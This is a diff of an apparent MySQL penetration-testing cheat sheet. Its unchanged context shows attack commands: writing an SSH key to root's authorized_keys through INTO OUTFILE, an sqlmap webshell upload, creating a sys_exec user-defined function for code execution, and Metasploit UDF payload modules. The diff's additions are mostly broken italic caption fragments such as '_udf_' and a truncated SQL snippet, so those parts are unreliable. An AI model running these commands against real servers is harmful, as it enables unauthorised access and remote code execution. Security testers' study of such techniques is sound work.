@@ -3,7 +3,7 @@ id: "ln1ygaanampsiugae"
 title: "mysql2"
 description: ""
 tags: []
-order: 4
+order: "4"
 createdAt: "2026-05-30T15:44:35.318Z"
 updatedAt: "2026-05-30T15:44:49.286Z"
 ---
@@ -249,6 +249,8 @@ SHOW VARIABLES LIKE '%secure%';
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
+_file_
+
 **Tags:** mysql, authenticated, enumeration, users, databases
 <!-- cmd: {"id":"47u6bvf4jmpsiuqtc","language":"bash","sectionId":"2pjwidgpgmpsiuqo1","tags":["mysql","authenticated","enumeration","users","databases"]} -->
 
@@ -331,6 +333,8 @@ SELECT "ssh-rsa AAAAB3..." INTO OUTFILE '/root/.ssh/authorized_keys';
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
+_file_
+
 **Tags:** mysql, file-write, webshell, outfile, exploitation, rce
 <!-- cmd: {"id":"x9ojfpjtjmpsiuqv0","language":"bash","sectionId":"bpmnrt7srmpsiuqo8","tags":["mysql","file-write","webshell","outfile","exploitation","rce"]} -->
 
@@ -411,7 +415,7 @@ sqlmap -u "http://$TARGET/page.php?id=1" --batch --file-write=shell.php --file-d
 SELECT @@version_compile_os, @@version_compile_machine;
 ```
 
-_UDF (User-Defined Function) Code Execution_
+_compile_
 
 **Tags:** mysql, udf, rce, exploitation, code-execution
 <!-- cmd: {"id":"eavyg8s5ampsiuqwh","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->
@@ -437,6 +441,8 @@ use exploit/multi/handler
 use exploit/linux/mysql/mysql_udf_payload (metasploit)
 ```
 
+_udf_
+
 **Tags:** mysql, udf, rce, exploitation, code-execution
 <!-- cmd: {"id":"xms1r7m9ympsiuqwu","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->
 
@@ -452,6 +458,8 @@ mysql -h $TARGET -u root -p'$PASS'
 ```bash
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 ```
+
+_exec RETURNS INTEGER SONAME 'lib_
 
 **Tags:** mysql, udf, rce, exploitation, code-execution
 <!-- cmd: {"id":"2lz6iw6jzmpsiuqx2","language":"bash","sectionId":"jgarmor7xmpsiuqog","tags":["mysql","udf","rce","exploitation","code-execution"]} -->
@@ -599,6 +607,8 @@ use auxiliary/scanner/mysql/mysql_version
 use exploit/linux/mysql/mysql_udf_payload
 ```
 
+_udf_
+
 **Tags:** mysql, metasploit, exploitation, enumeration
 <!-- cmd: {"id":"wa6du95campsiuqzb","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->
 
@@ -606,6 +616,8 @@ use exploit/linux/mysql/mysql_udf_payload
 ```bash
 use exploit/multi/mysql/mysql_udf_payload
 ```
+
+_udf_
 
 **Tags:** mysql, metasploit, exploitation, enumeration
 <!-- cmd: {"id":"omm7mvz7impsiuqzf","language":"bash","sectionId":"pqx4ayzaumpsiuqoo","tags":["mysql","metasploit","exploitation","enumeration"]} -->
@@ -677,6 +689,8 @@ nmap -p 3306 $TARGET
 ```bash
 SELECT @@secure_file_priv;
 ```
+
+_file_
 
 **Tags:** mysql, misconfiguration, empty-password, remote-root, anonymous
 <!-- cmd: {"id":"fbjupa3gumpsiur0t","language":"bash","sectionId":"qfq3oygcsmpsiuqoy","tags":["mysql","misconfiguration","empty-password","remote-root","anonymous"]} -->
